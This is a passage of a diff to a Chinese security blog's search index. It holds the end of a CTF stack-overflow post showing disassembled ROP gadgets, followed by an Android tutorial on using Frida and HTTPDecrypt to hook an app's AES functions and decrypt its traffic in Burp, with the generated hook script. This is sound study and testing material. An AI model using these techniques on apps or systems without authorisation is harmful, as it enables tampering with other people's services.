+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gef➤  x&#x2F;5i 0x000000000040061A</span><br><span class="line">   0x40061a &lt;__libc_csu_init+90&gt;:   pop    rbx</span><br><span class="line">   0x40061b &lt;__libc_csu_init+91&gt;:   pop    rbp</span><br><span class="line">   0x40061c &lt;__libc_csu_init+92&gt;:   pop    r12</span><br><span class="line">   0x40061e &lt;__libc_csu_init+94&gt;:   pop    r13</span><br><span class="line">   0x400620 &lt;__libc_csu_init+96&gt;:   pop    r14</span><br><span class="line">gef➤  x&#x2F;5i 0x000000000040061b</span><br><span class="line">   0x40061b &lt;__libc_csu_init+91&gt;:   pop    rbp</span><br><span class="line">   0x40061c &lt;__libc_csu_init+92&gt;:   pop    r12</span><br><span class="line">   0x40061e &lt;__libc_csu_init+94&gt;:   pop    r13</span><br><span class="line">   0x400620 &lt;__libc_csu_init+96&gt;:   pop    r14</span><br><span class="line">   0x400622 &lt;__libc_csu_init+98&gt;:   pop    r15</span><br><span class="line">gef➤  x&#x2F;5i 0x000000000040061A+3</span><br><span class="line">   0x40061d &lt;__libc_csu_init+93&gt;:   pop    rsp</span><br><span class="line">   0x40061e &lt;__libc_csu_init+94&gt;:   pop    r13</span><br><span class="line">   0x400620 &lt;__libc_csu_init+96&gt;:   pop    r14</span><br><span class="line">   0x400622 &lt;__libc_csu_init+98&gt;:   pop    r15</span><br><span class="line">   0x400624 &lt;__libc_csu_init+100&gt;:  ret</span><br><span class="line">gef➤  x&#x2F;5i 0x000000000040061e</span><br><span class="line">   0x40061e &lt;__libc_csu_init+94&gt;:   pop    r13</span><br><span class="line">   0x400620 &lt;__libc_csu_init+96&gt;:   pop    r14</span><br><span class="line">   0x400622 &lt;__libc_csu_init+98&gt;:   pop    r15</span><br><span class="line">   0x400624 &lt;__libc_csu_init+100&gt;:  ret</span><br><span class="line">   0x400625:    nop</span><br><span class="line">gef➤  x&#x2F;5i 0x000000000040061f</span><br><span class="line">   0x40061f &lt;__libc_csu_init+95&gt;:   pop    rbp</span><br><span class="line">   0x400620 &lt;__libc_csu_init+96&gt;:   pop    r14</span><br><span class="line">   0x400622 &lt;__libc_csu_init+98&gt;:   pop    r15</span><br><span class="line">   0x400624 &lt;__libc_csu_init+100&gt;:  ret</span><br><span class="line">   0x400625:    nop</span><br><span class="line">gef➤  x&#x2F;5i 0x0000000000400620</span><br><span class="line">   0x400620 &lt;__libc_csu_init+96&gt;:   pop    r14</span><br><span class="line">   0x400622 &lt;__libc_csu_init+98&gt;:   pop    r15</span><br><span class="line">   0x400624 &lt;__libc_csu_init+100&gt;:  ret</span><br><span class="line">   0x400625:    nop</span><br><span class="line">   0x400626:    nop    WORD PTR cs:[rax+rax*1+0x0]</span><br><span class="line">gef➤  x&#x2F;5i 0x0000000000400621</span><br><span class="line">   0x400621 &lt;__libc_csu_init+97&gt;:   pop    rsi</span><br><span class="line">   0x400622 &lt;__libc_csu_init+98&gt;:   pop    r15</span><br><span class="line">   0x400624 &lt;__libc_csu_init+100&gt;:  ret</span><br><span class="line">   0x400625:    nop</span><br><span class="line">gef➤  x&#x2F;5i 0x000000000040061A+9</span><br><span class="line">   0x400623 &lt;__libc_csu_init+99&gt;:   pop    rdi</span><br><span class="line">   0x400624 &lt;__libc_csu_init+100&gt;:  ret</span><br><span class="line">   0x400625:    nop</span><br><span class="line">   0x400626:    nop    WORD PTR cs:[rax+rax*1+0x0]</span><br><span class="line">   0x400630 &lt;__libc_csu_fini&gt;:  repz ret</span><br></pre></td></tr></table></figure>
+
+<h2 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h2><ul>
+<li>2016 XDCTF pwn100</li>
+<li>2016 华山杯 SU_PWN</li>
+</ul>
+<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://en.wikipedia.org/wiki/Stack_buffer_overflow">stack buffer overflow</a></p>
 <p><a href="http://bobao.360.cn/learning/detail/3694.html">http://bobao.360.cn/learning/detail/3694.html</a></p>
 <p><a href="https://www.cnblogs.com/rec0rd/p/7646857.html">https://www.cnblogs.com/rec0rd/p/7646857.html</a></p>
 <p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/stackoverflow-basic-zh/">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/stackoverflow-basic-zh/</a></p>
-]]></content>
+<p><a href="http://wooyun.jozxing.cc/static/drops/papers-7551.html">http://wooyun.jozxing.cc/static/drops/papers-7551.html</a></p>
+<p><a href="http://wooyun.jozxing.cc/static/drops/binary-10638.html">http://wooyun.jozxing.cc/static/drops/binary-10638.html</a></p>
+<h2 id><a href="#" class="headerlink" title></a></h2>]]></content>
       <categories>
         <category>二进制安全</category>
       </categories>
@@ -6917,6 +7046,74 @@ In get/set mode no capture occurs.</code></pre><blockquote>
       </categories>
       <tags>
         <tag>icarus</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>使用Httpdecrypy进行HOOK</title>
+    <url>/2020/12/29/Android/%E4%BD%BF%E7%94%A8Httpdecrypy%E8%BF%9B%E8%A1%8CHOOK/</url>
+    <content><![CDATA[<h2 id="本机环境"><a href="#本机环境" class="headerlink" title="本机环境"></a>本机环境</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.mumu模拟器</span><br><span class="line">2.httpdecrypt（https:&#x2F;&#x2F;github.com&#x2F;lyxhh&#x2F;lxhToolHTTPDecrypt）</span><br><span class="line">3.frida 12.11.17</span><br><span class="line">4.Mac os 10.15.5</span><br></pre></td></tr></table></figure>
+
+<h2 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h2><h3 id="1-使用mumu模拟器连接adb"><a href="#1-使用mumu模拟器连接adb" class="headerlink" title="1. 使用mumu模拟器连接adb"></a>1. 使用mumu模拟器连接adb</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">adb kill-server &amp;&amp; adb server &amp;&amp; adb shell</span><br></pre></td></tr></table></figure>
+
+<p>安装时使用4.3.2版本 5.0版本报错</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">The client is using an unsupported version of the Socket.IO or Engine.IO protocols</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pip install flask-socketio&#x3D;&#x3D;4.3.2</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-对注册功能抓包"><a href="#2-对注册功能抓包" class="headerlink" title="2. 对注册功能抓包"></a>2. 对注册功能抓包</h3><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201229120510857.png" alt="image-20201229120510857"></p>
+<p>可以看到securityCode以及post内容均为加密内容</p>
+<h3 id="3-运行httpdecrypt"><a href="#3-运行httpdecrypt" class="headerlink" title="3. 运行httpdecrypt"></a>3. 运行httpdecrypt</h3><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201229120648649.png" alt="image-20201229120648649"></p>
+<p>找到目标app 将app包名com.xxx.xxx填入框中并点击Confirm</p>
+<h3 id="4-然后点击Hooks功能"><a href="#4-然后点击Hooks功能" class="headerlink" title="4. 然后点击Hooks功能"></a>4. 然后点击Hooks功能</h3><p>在Match中输入刚才的包名 点击Confirm</p>
+<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201229121019274.png" alt="image-20201229121019274"></p>
+<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201229121218308.png" alt="image-20201229121218308"></p>
+<h3 id="5-重新进行注册功能操作"><a href="#5-重新进行注册功能操作" class="headerlink" title="5. 重新进行注册功能操作"></a>5. 重新进行注册功能操作</h3><p>根据数据包中的参数，找到对应的方法</p>
+<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201229145006899.png" alt="image-20201229145006899"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">com.xxx.xxx.ybblibrary.comm.commTools.tool.EncryptionTool$AES.encrypt(argType0 : object argType1 : string)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201229145315814.png" alt="image-20201229145315814"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">com.xxx.xxx.ybblibrary.comm.commTools.tool.EncryptionTool.EncoderByMd5(argType0 : string)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201229145518763.png" alt="image-20201229145518763"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">com.xxx.xxx.ybblibrary.comm.commTools.tool.EncryptionTool$AES.decrypt(argType0 : object argType1 : string)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="6-查看加密函数"><a href="#6-查看加密函数" class="headerlink" title="6. 查看加密函数"></a>6. 查看加密函数</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">com.xxx.xxx.ybblibrary.comm.commTools.tool.EncryptionTool$AES.encrypt(argType0 : object argType1 : string)</span><br></pre></td></tr></table></figure>
+
+<p>有两个参数 一个是对象 一个是字符串 我们还需要知道对象的具体的参数类型</p>
+<p>在Finds中搜索函数的类名</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">com.xxx.xxx.ybblibrary.comm.commTools.tool</span><br></pre></td></tr></table></figure>
+
+<p>然后点击Confirm<br>找到方法名EncryptionTool$AES encrypt<br>可以看到其具体的参数类型</p>
+<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201229145750559.png" alt="image-20201229145750559"></p>
+<p>加密函数中参数对象的具体的类型为static</p>
+<h2 id="代码生成"><a href="#代码生成" class="headerlink" title="代码生成"></a>代码生成</h2><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201229145856477.png" alt="image-20201229145856477" style="zoom:50%;">
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.转到toBurp模块</span><br><span class="line">2.然后点击Confirm</span><br><span class="line">3.点击add</span><br><span class="line">由于这个加密函数有两个参数 所以需要自己编辑代码（默认只有一个参数）</span><br><span class="line">4.由于对象参数是static类型 所以选择static类型</span><br><span class="line">动态的选择instance类型</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201229150310913.png" alt="image-20201229150310913"></p>
+<h3 id="1-在custom中会生成代码"><a href="#1-在custom中会生成代码" class="headerlink" title="1. 在custom中会生成代码"></a>1. 在custom中会生成代码</h3><p>arg0是传过来的加密字符串 arg1是Android的Context的对象</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var context &#x3D; Java.use(&#39;android.app.ActivityThread&#39;).currentApplication().getApplicationContext();</span><br></pre></td></tr></table></figure>
+
+<p>最终代码</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;use strict&#39;;</span><br><span class="line"></span><br><span class="line">var rpc_result &#x3D; null;</span><br><span class="line">var rpc_result_ios &#x3D; null;</span><br><span class="line">rpc.exports &#x3D; &#123;</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">tagf0f1c91ca14d835ab8ae6e62346a447d02: function(arg0, arg1)&#123;</span><br><span class="line">        Java.perform(function () &#123;</span><br><span class="line">            try&#123;</span><br><span class="line">				var context &#x3D; Java.use(&#39;android.app.ActivityThread&#39;).currentApplication().getApplicationContext();</span><br><span class="line">                var EncryptionTool$AES0224190b5b0f850f45017089f29e6428 &#x3D; Java.use(&quot;com.xxx.xxx.ybblibrary.comm.commTools.tool.EncryptionTool$AES&quot;);</span><br><span class="line">                rpc_result &#x3D; EncryptionTool$AES0224190b5b0f850f45017089f29e6428.decrypt(context,arg0);</span><br><span class="line">                &#x2F;&#x2F; send(JSON.stringify(&#123;&quot;aa&quot;:&quot;bb&quot;,&quot;aa1&quot;:&quot;bbb&quot;&#125;)+&#39;-cusoto0oom0sc0ri0pt-&#39;)</span><br><span class="line">            &#125;catch(e)&#123;send(&quot;tagf0f1c91ca14d835ab8ae6e62346a447d02, &quot; + e + &quot;-er00roo000r-&quot;)&#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        return rpc_result;</span><br><span class="line">    &#125;,</span><br><span class="line">&#x2F;&#x2F; Added Function </span><br><span class="line">tag24239e10fd5afd01a5459978c4306b1f02: function(arg0, arg1)&#123;</span><br><span class="line">        Java.perform(function () &#123;</span><br><span class="line">            try&#123;</span><br><span class="line">				var context &#x3D; Java.use(&#39;android.app.ActivityThread&#39;).currentApplication().getApplicationContext();</span><br><span class="line">                var EncryptionTool$AES2b8ecc9bd5061994b912287f6411ac57 &#x3D; Java.use(&quot;com.xxx.xxx.ybblibrary.comm.commTools.tool.EncryptionTool$AES&quot;);</span><br><span class="line">                rpc_result &#x3D; EncryptionTool$AES2b8ecc9bd5061994b912287f6411ac57.encrypt(context,arg0);</span><br><span class="line">                &#x2F;&#x2F; send(JSON.stringify(&#123;&quot;aa&quot;:&quot;bb&quot;,&quot;aa1&quot;:&quot;bbb&quot;&#125;)+&#39;-cusoto0oom0sc0ri0pt-&#39;)</span><br><span class="line">            &#125;catch(e)&#123;send(&quot;tag24239e10fd5afd01a5459978c4306b1f02, &quot; + e + &quot;-er00roo000r-&quot;)&#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        return rpc_result;</span><br><span class="line">    &#125;,</span><br><span class="line">&#x2F;&#x2F; Added Function </span><br><span class="line"></span><br><span class="line">	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-loadScript"><a href="#2-loadScript" class="headerlink" title="2.loadScript"></a>2.loadScript</h3><p>点击左上角loadScript</p>
+<h3 id="3-在burpsutie中进行设置"><a href="#3-在burpsutie中进行设置" class="headerlink" title="3.在burpsutie中进行设置"></a>3.在burpsutie中进行设置</h3><p>下载burp插件HTTPDecrpyt并进行安装</p>
+<p><a href="https://github.com/lyxhh/lxhToolHTTPDecrypt/releases">https://github.com/lyxhh/lxhToolHTTPDecrypt/releases</a></p>
+<p>选择到encrypt 然后右键发送到toBurp模块</p>
+<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201229150805594.png" alt="image-20201229150805594"></p>
+<p>选择加密后的数据 然后根据配置的方法进行解密</p>
+<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201229150956317.png" alt="image-20201229150956317"></p>
+<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201229151136475.png" alt="image-20201229151136475"></p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="http://www.ironheart.top/index.php/archives/22/">http://www.ironheart.top/index.php/archives/22/</a></p>
+<p><a href="https://xz.aliyun.com/t/7130">https://xz.aliyun.com/t/7130</a></p>
+<p><a href="https://www.t00ls.net/articles-51070.html#tls4">https://www.t00ls.net/articles-51070.html#tls4</a></p>
+]]></content>
+      <categories>
+        <category>Android</category>
+      </categories>
+      <tags>
+        <tag>Httpdecrypy</tag>
       </tags>
   </entry>
 </search>
